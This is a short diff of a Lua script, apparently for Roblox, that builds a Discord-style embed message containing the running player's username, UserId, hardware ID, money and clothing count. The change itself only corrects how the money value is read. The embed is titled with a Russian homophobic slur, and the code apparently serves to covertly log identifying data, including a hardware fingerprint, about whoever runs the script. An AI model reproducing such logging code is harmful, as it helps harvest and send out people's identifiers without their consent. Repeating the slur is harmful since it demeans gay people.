@@ -19,7 +19,7 @@ local money = game:GetService("Players").LocalPlayer.leaderstats.Rub
         ["embeds"] = {
             {
                 ["title"] = "**PIDARAS DETECTED**",
-                ["description"] = "Username: " .. game.Players.LocalPlayer.Name ..  " \n UserId: " .. game.Players.LocalPlayer.UserId .. " \n Hwid: " .. hwid .. "\n Money:" .. tostring(money) .. "\n Clotches:" .. #clamount,
+                ["description"] = "Username: " .. game.Players.LocalPlayer.Name ..  " \n UserId: " .. game.Players.LocalPlayer.UserId .. " \n Hwid: " .. hwid .. "\n Money:" .. tostring(money.Value) .. "\n Clotches:" .. #clamount,
                 ["type"] = "rich",
                 ["color"] = tonumber(0x7269da),
             }
